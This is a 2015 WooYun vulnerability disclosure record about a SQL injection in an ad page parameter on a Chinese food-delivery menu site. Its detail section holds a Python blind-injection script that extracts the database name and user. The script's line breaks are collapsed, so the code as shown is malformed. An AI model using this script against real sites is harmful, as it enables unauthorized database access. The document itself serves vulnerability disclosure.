{"id": 68093, "wybug_id": "wooyun-2015-0141669", "wybug_title": "外卖菜单平台叫饭网某处SQL注入", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-09-19 09:36", "wybug_open_date": "2015-11-05 16:08", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-21：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向公众公开  简要描述： 叫饭网某页面SQL注入漏洞 详细说明：  注入位置：\nhttp://**.**.**.**/ad.php?adid=1515\n\n\n\n\n数据库名称及数据库用户名\n\n代码\n# -*- coding: utf-8 -*-import urllib2url_pre = 'http://**.**.**.**/ad.php?adid=1515%20AND%20' payloads = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')  for db_name_len in range(1, 50): # 获取数据库名称的长度    url = url_pre + 'length(database())%3d' + str(db_name_len)    res = urllib2.urlopen(url)    html = res.read().decode('utf-8')    keyword = u'出游套餐'    if keyword in html:        breakprint 'db_name_len:', db_name_lenfor user_len in range(1, 50): # 获取数据库用户名的长度    url = url_pre + 'length(user())%3d' + str(user_len)    res = urllib2.urlopen(url)    html = res.read().decode('utf-8')    keyword = u'出游套餐'    if keyword in html:        breakprint 'user_len:', user_lendb_name = ''for i in range(1, db_name_len + 1): # 获取数据库名称    for j in range(len(payloads)):        url_mid =  'ascii(mid(database(),%d,1))%%3d' %i        url = url_pre + url_mid + str(ord(payloads[j]))        res = urllib2.urlopen(url)        html = res.read().decode('utf-8')        keyword = u'出游套餐'        if keyword in html:            db_name += payloads[j]            break      print 'database\\'s name:', db_nameuser = ''for i in range(1, user_len + 1): # 获取数据库用户名    for j in range(len(payloads)):        url_mid =  'ascii(mid(user(),%d,1))%%3d' %i        url = url_pre + url_mid + str(ord(payloads[j]))        res = urllib2.urlopen(url)        html = res.read().decode('utf-8')        keyword = u'出游套餐'        if keyword in html:            user += payloads[j]            breakprint 'user:', user\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-09-21 16:06 厂商回复： 暂未建立与网站管理单位的直接处置渠道,待认领. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}